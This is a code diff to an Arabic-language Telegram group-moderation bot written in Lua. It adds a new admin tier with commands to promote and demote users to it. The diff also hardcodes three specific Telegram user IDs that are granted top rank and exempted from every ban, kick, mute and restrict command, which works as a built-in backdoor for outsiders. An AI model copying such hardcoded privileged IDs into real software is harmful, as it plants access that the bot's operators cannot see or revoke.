@@ -492,13 +492,48 @@ end
 return MsgShow 
 end
 
+function Rank_Checking(UserID,ChatID)
+if UserID == our_id then 
+var = true
+elseif  tonumber(UserID) == tonumber(2076385185) then
+var = true
+elseif  tonumber(UserID) == tonumber(816666668) then
+var = true
+elseif  tonumber(UserID) == tonumber(2061769984) then
+var = true
+elseif  UserID == SUDO_ID then
+var = true
+elseif redis:sismember(max..':SUDO_BOT:',UserID) then
+var = true
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then
+var = true
+elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then
+var = true
+elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then
+var = true
+elseif redis:sismember(max..'owners:'..ChatID,UserID) then
+var = true
+elseif redis:sismember(max..'admins:'..ChatID,UserID) then
+var = true
+elseif redis:sismember(max..'whitelist:'..ChatID,UserID) then
+var = false
+else
+var = false
+end
+return var
+end
+
 function Getrtba(UserID,ChatID)
 if UserID == our_id then 
 var = 'البوت' 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+var = '🎖Aec' 
 elseif  UserID == SUDO_ID then
+var = 'Dev🎖' 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then
 var = '🎖MR' 
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then
-var = 'MR' 
+var = 'M' 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then
 var = ' المالك الاساسي' 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then
@@ -553,25 +588,51 @@ end
 --================================{{  List Sudoer  }} ===================================
 
 
-function sudolist(msg)
+function sudolM(msg)
 local list = redis:smembers(max..':SUDO_BOT:')
-message = '*•* قائمة MR : \n• MR🎖\n'..SUDO_USER..' :\n\n'
-if #list==0 then  message = message.."• لايوجد MR ."
+message = '*•* قائمه M : \n\n*•* ['..SUDO_USER..'] : (' ..SUDO_ID.. ')'..redis:scard(max..'mtwr_count'..SUDO_ID)..'\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'
+if #list==0 then  message = message.."* لا يوجد M  حاليا \n  *"
 else
 for k,v in pairs(list) do
-local info = redis:hgetall(max..'username:'..v)
+local info  = redis:hgetall(max..'username:'..v)
 local count = redis:scard(max..'mtwr_count'..v)
 if info and info.username and info.username:match("@[%a%d_]+") then
-message = message ..k.. '•  '..(info.username or '')..' » \n'
+message = message ..k.."- ["..info.username..'] : (`' ..v.. '`)'..count..' \n'
 else
-message = message ..k.. '•  '..(info.username or '')..' » \n'
+message = message ..k.. '- ['..info.username..'](t.me/KBBBD) : (`' ..v.. '`)'..count..' \n'
 end
 end 
 end
-send_msg(msg.chat_id_,message,msg.id_)
-print(message)
-return false 
+if utf8.len(message) > 4096 then
+return "• لا يمكن عرض M بسبب القائمه كبيره جدا ."
+else
+return message
 end
+end
+
+
+function sudolMR(msg)
+local list = redis:smembers(max..':SUDO_BOOOT:')
+message = '*•* قائمه MR : \n\n*•* ['..SUDO_USER..'] : (' ..SUDO_ID.. ')'..redis:scard(max..'mtwr_count'..SUDO_ID)..'\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'
+if #list==0 then  message = message.."* لا يوجد MR 🎖 حاليا \n  *"
+else
+for k,v in pairs(list) do
+local info  = redis:hgetall(max..'username:'..v)
+local count = redis:scard(max..'mtwr_count'..v)
+if info and info.username and info.username:match("@[%a%d_]+") then
+message = message ..k.."- ["..info.username..'] : (`' ..v.. '`)'..count..' \n'
+else
+message = message ..k.. '- ['..info.username..'](t.me/KBBBD) : (`' ..v.. '`)'..count..' \n'
+end
+end 
+end
+if utf8.len(message) > 4096 then
+return "• لا يمكن عرض MR بسبب القائمه كبيره جدا ."
+else
+return message
+end
+end
+
 
 --================================{{  List owner  }} ===================================
 
@@ -1037,7 +1098,7 @@ return sendMsg(msg.chat_id_,msg.id_,'*•* عذراً لست مشرف في ال�
 else
 local lock_service = redis:get(max..'lock_service')
 if lock_service then 
-sendMsg(msg.chat_id_,msg.id_,'*• تم التفعيل\n•* ورفع جميع المشرفين \n•')
+sendMsg(msg.chat_id_,msg.id_,'*• تم التفعيل\n•* ورفع جميع المشرفين \n')
 else
 sendMsg(msg.chat_id_,msg.id_,'• تم تفعيل‏‏️المجموعه بنجاح')
 end
@@ -1151,10 +1212,14 @@ USERCAR = utf8.len(USERNAME)
 if cmd =="tqeed" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك تقييد البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك تقييد Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك تقييد MR . ") 
-elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك تقييد Dev . ") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"‍*•* لا يمكنك تقييد MR .") 
+elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"‍*•* لا يمكنك تقييد M .")
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك تقييد المالك الاساسي .") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then
@@ -1320,10 +1385,14 @@ end
 if cmd == "ban" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Dev .") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR .") 
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر M . ") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*• * لا يمكنك حظر المالك .") 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
@@ -1360,10 +1429,14 @@ end
 if cmd == "silent" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم MR .") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم Dev .") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم MR . ")
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم MR . ") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم M . ") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم المالك .") 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
@@ -1392,10 +1465,14 @@ end
 if cmd == "banall" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر البوت ") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ")
-elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Dev . ")
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ") 
+elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر M . ") 
 end
 if GeneralBanned(UserID) then return sendMsg(ChatID,MsgID,'*•* المستخدم : '..USERNAME..'\n*•* الايدي : '..UserID..'\n*•* تم حظره عام️ بنجاح') end
 redis:hset(max..'username:'..UserID, 'username',Resolv)
@@ -1415,10 +1492,14 @@ end
 if cmd == "kick" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*• * لا يمكنك طرد البوت ") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*• * لا يمكنك طرد MR .") 
+return sendMsg(ChatID,MsgID,"*• * لا يمكنك طرد Dev .") 
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
-return sendMsg(ChatID,MsgID,"*• * لا يمكنك طرد MR . ") 
+return sendMsg(ChatID,MsgID,"*• * لا يمكنك طرد M . ") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*• * لا يمكنك طرد MR . ")
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*• * لا يمكنك طرد المالك .") 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
@@ -1453,10 +1534,14 @@ SudoGroups = "عضو"
 end
 if UserID == our_id then 
 Getrtb = 'ادمن' 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+Getrtb = '🎖Aec' 
 elseif  UserID == SUDO_ID then
+Getrtb = 'Dev🎖' 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then
 Getrtb = '🎖MR' 
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then
-Getrtb = 'MR' 
+Getrtb = 'M' 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then
 Getrtb = 'المالك الاساسي' 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then
@@ -1474,6 +1559,29 @@ return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n\
 end)
 end
 
+if cmd == "up_sudoo" then
+if UserID == our_id then 
+return sendMsg(ChatID,MsgID,"*• * عذراً لا يمكنني رفع نفسي") 
+elseif data.type_.ID == "UserTypeBot" then
+return sendMsg(ChatID,MsgID,"*• * عذراً لا يمكنني رفع بوت ") 
+end
+if redis:sismember(max..':SUDO_BOOOT:',UserID) then 
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم رفعه MR في مسبقاً',17,USERCAR) 
+end
+redis:hset(max..'username:'..UserID, 'username', Resolv)
+redis:sadd(max..':SUDO_BOOOT:',UserID)
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم رفعه MR في البوت',17,USERCAR) 
+end
+
+if cmd == "dn_sudoo" then
+if not redis:sismember(max..':SUDO_BOOOT:',UserID) then 
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• ليس MR مسبقاً',17,USERCAR) 
+end
+redis:srem(max..':SUDO_BOOOT:',UserID)
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم تنزيله من MR',17,USERCAR) 
+end  -- End Cmd 
+
+
 if cmd == "up_sudo" then
 if UserID == our_id then 
 return sendMsg(ChatID,MsgID,"*• * عذراً لا يمكنني رفع نفسي") 
@@ -1481,26 +1589,25 @@ elseif data.type_.ID == "UserTypeBot" then
 return sendMsg(ChatID,MsgID,"*• * عذراً لا يمكنني رفع بوت ") 
 end
 if redis:sismember(max..':SUDO_BOT:',UserID) then 
-return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم رفعه MR في مسبقاً',17,USERCAR) 
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم رفعه M في مسبقاً',17,USERCAR) 
 end
 redis:hset(max..'username:'..UserID, 'username', Resolv)
 redis:sadd(max..':SUDO_BOT:',UserID)
-return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم رفعه MR في البوت',17,USERCAR) 
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم رفعه M في البوت',17,USERCAR) 
 end
 
 if cmd == "dn_sudo" then
 if not redis:sismember(max..':SUDO_BOT:',UserID) then 
-return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• ليس MR مسبقاً',17,USERCAR) 
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• ليس M مسبقاً',17,USERCAR) 
 end
 redis:srem(max..':SUDO_BOT:',UserID)
-return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم تنزيله من MR',17,USERCAR) 
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم تنزيله من M',17,USERCAR) 
 end  -- End Cmd 
 end,nil)
 else
 return sendMsg(ChatID,MsgID,"*•* عذراً هذا العضو ليس موجود في المجموعات")
 end 
 end
-
 
 function action_by_username(arg,data)
 local cmd = arg.cmd 
@@ -1514,10 +1621,14 @@ print(UserName)
 if cmd =="tqeed" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*• * لا يمكنك تقييد البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك تقييد Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*• * لا يمكنك تقيد MR .") 
-elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*• * لا يمكنك تقيد Dev .") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"*• * لا يمكنك تقييد MR .")
+elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*• * لا يمكنك تقييد M .")
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*• * لا يمكنك تقييد المالك الاساسي .") 
 elseif redis:sismember(max..'MONSHA_BOT:'..ChatID,UserID) then 
@@ -1672,10 +1783,14 @@ end
 if cmd == "ban" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR .") 
-elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Dev .") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ") 
+elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر M . ") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر المالك .") 
 elseif redis:sismember(max..'owners:'..ChatID,UserID) then 
@@ -1716,10 +1831,14 @@ end
 if cmd == "silent" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم Dev .") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم MR .") 
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم MR .") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم M .") 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم المالك .") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
@@ -1748,10 +1867,14 @@ end
 if cmd == "banall" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر البوت ") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR .")
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Dev .")
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ")
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر M . ") 
 end
 if GeneralBanned(UserID) then 
 return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•* الايدي : '..UserID..'\n*•* تم حظره عام️ بنجاح') 
@@ -1773,10 +1896,14 @@ end
 if cmd == "kick" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد البوت ") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد MR . ") 
-elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد Dev . ") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد MR .") 
+elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد M .") 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد المالك الاساسي ") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
@@ -1800,21 +1927,38 @@ end)
  
 end
 
-if cmd == "up_sudo" then
-if redis:sismember(max..':SUDO_BOT:',UserID) then 
+if cmd == "up_sudoo" then
+if redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•* الايدي : '..UserID..'\n*•*MR مسبقاً') 
 end
 redis:hset(max..'username:'..UserID, 'username', UserName)
-redis:sadd(max..':SUDO_BOT:',UserID)
+redis:sadd(max..':SUDO_BOOOT:',UserID)
 return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•*الايدي : '..UserID..'\n• تم رفعه MR في البوت')
+end
+
+if cmd == "dn_sudoo" then
+if not redis:sismember(max..':SUDO_BOOOT:',UserID) then 
+return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•* الايدي : '..UserID..'\n*•* ليس MR مسبقاً')
+end
+redis:srem(max..':SUDO_BOOOT:',UserID)
+return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•*الايدي : '..UserID..'\n*•* تم تنزيله من MR') 
+end
+
+if cmd == "up_sudo" then
+if redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•* الايدي : '..UserID..'\n*•*M مسبقاً') 
+end
+redis:hset(max..'username:'..UserID, 'username', UserName)
+redis:sadd(max..':SUDO_BOT:',UserID)
+return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•*الايدي : '..UserID..'\n• تم رفعه M في البوت')
 end
 
 if cmd == "dn_sudo" then
 if not redis:sismember(max..':SUDO_BOT:',UserID) then 
-return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•* الايدي : '..UserID..'\n*•* ليس MR مسبقاً')
+return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•* الايدي : '..UserID..'\n*•* ليس M مسبقاً')
 end
 redis:srem(max..':SUDO_BOT:',UserID)
-return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•*الايدي : '..UserID..'\n*•* تم تنزيله من MR') 
+return sendMsg(ChatID,MsgID,'*•* المستخدم : '..UserName..'\n*•*الايدي : '..UserID..'\n*•* تم تنزيله من M') 
 end
 
 else
@@ -1846,10 +1990,14 @@ USERCAR = utf8.len(USERNAME)
 if cmd == "tqeed" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك تقييد البوت ") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد Dev .") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد MR .") 
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد MR .") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد M .") 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد المالك الاساسي ") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
@@ -1941,28 +2089,47 @@ return SendMention(ChatID,UserID,MsgID,'• الاسم » '..namei..'\n'
 end)
 end
 
-if cmd == "up_sudo" then
-if redis:sismember(max..':SUDO_BOT:',UserID) then 
+if cmd == "up_sudoo" then
+if redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• MR مسبقاً',17,USERCAR) 
 end
 redis:hset(max..'username:'..UserID, 'username', Resolv)
-redis:sadd(max..':SUDO_BOT:',UserID)
+redis:sadd(max..':SUDO_BOOOT:',UserID)
 return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم رفعه MR في البوت',17,USERCAR) 
 end
 
-if cmd == "dn_sudo" then
-if not redis:sismember(max..':SUDO_BOT:',UserID) then return sendMsg(ChatID,MsgID,'*•* المستخدم : '..USERNAME..' \n*•* الايدي : '..UserID..'\n*•* ليس MR مسبقاً') end
-redis:srem(max..':SUDO_BOT:',UserID) 
+if cmd == "dn_sudoo" then
+if not redis:sismember(max..':SUDO_BOOOT:',UserID) then return sendMsg(ChatID,MsgID,'*•* المستخدم : '..USERNAME..' \n*•* الايدي : '..UserID..'\n*•* ليس MR مسبقاً') end
+redis:srem(max..':SUDO_BOOOT:',UserID) 
 return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم تنزيله من MR️',17,USERCAR) 
+end
+
+if cmd == "up_sudo" then
+if redis:sismember(max..':SUDO_BOT:',UserID) then 
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• M مسبقاً',17,USERCAR) 
+end
+redis:hset(max..'username:'..UserID, 'username', Resolv)
+redis:sadd(max..':SUDO_BOT:',UserID)
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم رفعه M في البوت',17,USERCAR) 
+end
+
+if cmd == "dn_sudo" then
+if not redis:sismember(max..':SUDO_BOT:',UserID) then return sendMsg(ChatID,MsgID,'*•* المستخدم : '..USERNAME..' \n*•* الايدي : '..UserID..'\n*•* ليس M مسبقاً') end
+redis:srem(max..':SUDO_BOT:',UserID) 
+return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم تنزيله من M️',17,USERCAR) 
 end
 
 if cmd == "ban" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Dev . ") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ")
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر M . ") 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر المالك الاساسي .") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
@@ -1984,10 +2151,14 @@ end
 if cmd == "kick" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد MR . ") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد Dev . ") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد MR . ")
 elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد MR . ") 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد M. ") 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك طرد المالك الاساسي ") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
@@ -2025,10 +2196,14 @@ end
 if cmd == "ktm" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم MR .") 
-elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم Dev .") 
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم MR . ") 
+elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم M . ") 
 elseif redis:sismember(max..':KARA_BOT:'..ChatID,UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك كتم المالك .") 
 elseif redis:sismember(max..':MONSHA_BOT:'..ChatID,UserID) then 
@@ -2061,10 +2236,14 @@ end
 if cmd == "bandall" then
 if UserID == our_id then   
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر البوت .") 
+elseif UserID == 2076385185 or UserID == 816666668 or UserID == 2061769984 then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Ace 🎖\n") 
 elseif UserID == SUDO_ID then 
-return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR .")
-elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر Dev .")
+elseif redis:sismember(max..':SUDO_BOOOT:',UserID) then 
 return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر MR . ") 
+elseif redis:sismember(max..':SUDO_BOT:',UserID) then 
+return sendMsg(ChatID,MsgID,"*•* لا يمكنك حظر M . ") 
 end
 if GeneralBanned(UserID) then 
 return SendMention(ChatID,UserID,MsgID,'• المستخدم : '..USERNAME..'\n• الايدي : '..UserID..'\n• تم الغاء حظره عام️ بنجاح',17,USERCAR) 
